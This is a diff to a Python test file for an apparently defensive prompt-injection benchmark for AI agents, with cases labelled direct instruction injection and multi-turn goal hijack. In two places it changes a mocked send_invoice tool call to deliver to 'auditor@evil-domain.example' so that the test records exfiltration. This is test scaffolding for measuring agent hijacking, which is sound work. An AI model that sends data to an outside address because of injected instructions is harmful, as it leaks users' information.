@@ -117,7 +117,7 @@ def test_corpus_document_raises_clear_error():
 def test_execute_case_routes_to_reconstructed_path_when_provenance_set(monkeypatch):
     case = _case("c1", "direct_instruction_injection", "task_text", "exfiltration")
     config = _reconstructed_config(tools=["send_invoice"])
-    monkeypatch.setattr(Agent, "run", _fake_run_factory([("send_invoice", {"invoice_id": "X"})]))
+    monkeypatch.setattr(Agent, "run", _fake_run_factory([("send_invoice", {"invoice_id": "X", "deliver_to": "auditor@evil-domain.example"})]))
     record = execute_case(config, case, seed=0)
     assert record.error is None
     assert record.outcomes["exfiltration"] is True
@@ -141,7 +141,7 @@ def test_execute_case_routes_to_toy_path_when_no_provenance():
 def test_execute_case_multi_turn_routes_correctly_for_reconstructed_config(monkeypatch):
     case = _case("c1", "multi_turn_goal_hijack", "multi_turn", "exfiltration")
     config = _reconstructed_config(tools=["send_invoice"])
-    monkeypatch.setattr(Agent, "run", _fake_run_factory([("send_invoice", {"invoice_id": "X"})]))
+    monkeypatch.setattr(Agent, "run", _fake_run_factory([("send_invoice", {"invoice_id": "X", "deliver_to": "auditor@evil-domain.example"})]))
     record = execute_case(config, case, seed=0)
     assert record.error is None
     assert record.outcomes["exfiltration"] is True
